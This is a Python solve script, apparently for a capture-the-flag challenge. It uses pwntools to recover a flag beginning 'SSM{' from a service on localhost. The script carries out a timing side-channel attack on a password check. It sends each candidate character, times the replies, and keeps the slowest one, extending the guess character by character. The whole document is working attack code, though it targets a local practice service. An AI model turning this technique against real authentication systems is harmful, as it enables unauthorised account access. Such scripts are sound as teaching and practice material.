import time

from pwn import *

from tqdm import tqdm

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}()$%&"
NUM_TESTS = 2

REMOTE = remote("127.0.0.1", 50000)
REMOTE.recvline()

def time_password(password):
    timings = []
    # print("testing", password)
    for i in range(NUM_TESTS):
        t = time.perf_counter()
        REMOTE.sendline(password.encode())
        res = REMOTE.recvlines(2) # unused var, lost the cat pic :(
        dt = time.perf_counter() - t
        timings.append(dt)
    return sum(timings) / len(timings)

def find_next(base):
    timings = []
    for c in tqdm(CHARS):
        timings.append((c, time_password(base + c)))
    sorted_timings = sorted(timings, key=lambda x: x[1], reverse=True)
    print(sorted_timings[:10])
    return sorted_timings[0]



flag = "SSM{"

while True:
    print(flag)
    a = find_next(flag)
    flag += a[0]
